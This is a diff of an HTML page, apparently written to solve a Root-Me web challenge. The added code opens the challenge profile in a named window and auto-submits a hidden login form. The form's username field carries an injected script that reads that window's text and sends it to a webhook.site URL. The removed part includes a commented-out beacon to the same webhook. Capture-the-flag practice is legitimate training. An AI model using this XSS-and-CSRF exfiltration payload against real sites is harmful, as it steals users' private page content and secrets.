@@ -1,40 +1,26 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <title>Test</title>
-</head>
 <body>
-  <h1>Page de test 6</h1>
-  
-    <div id="out"></div>
-
-  <script>
-    console.log("Page chargée");
-
-      const out = document.getElementById("out");
-      out.textContent = window.opener ? "OPENER: OUI" : "OPENER: NON";
-      
-      // Bonus debug : montre le type, sans accéder au DOM de l'opener
-      //console.log("typeof window.opener =", typeof window.opener);
-
-       //console.log("window.opener =", window.opener);
-     // console.log("window.opener === null ?", window.opener === null);
-      //console.log("document.referrer =", document.referrer);
-    let w = window.open("http://challenge01.root-me.org:58003/profile");
-    console.log(w.document.body.innerText);
-    console.log(window.opener.document.body.innerText);
-      //document.write('<IMG SRC=\"https://webhook.site/fbc71fa2-f69c-4896-93a7-e14745a28ee0?a=' + document.opener + '\">Hacked</IMG>');
-     //setTimeout(() => {
-      //console.log("20 secondes plus tard");
-      //}, 20000);
-
-    //const start = performance.now();
-  //while (performance.now() - start < 20000) {}
-  //console.log("Fin du blocage");
-   //console.log("Fin");
-
-  </script>
-
+<h1>Chargement...</h1>
+<script>
+    let w = window.open('http://challenge01.root-me.org:58003/profil', 'fenetre_victim');
+    setTimeout(() => {
+        var f = document.createElement('form');
+        f.action = 'http://challenge01.root-me.org:58003/login'; 
+        f.method = 'POST';
+        
+        var u = document.createElement('input');
+        u.type = 'hidden'; u.name = 'username'; 
+        u.value = "<script>var f = window.open('', 'fenetre_victim'); var secret = f.document.body.innerText;location.href = 'https://webhook.site/fbc71fa2-f69c-4896-93a7-e14745a28ee0?s=' + encodeURIComponent(secret);</script>";
+        f.appendChild(u);
+        var p = document.createElement('input');
+        p.type = 'hidden'; p.name = 'secret'; p.value = '1234'; 
+        f.appendChild(p);
+        document.body.appendChild(f);
+        f.submit();
+     
+        
+    }, 2000);
+</script>
 </body>
 </html>
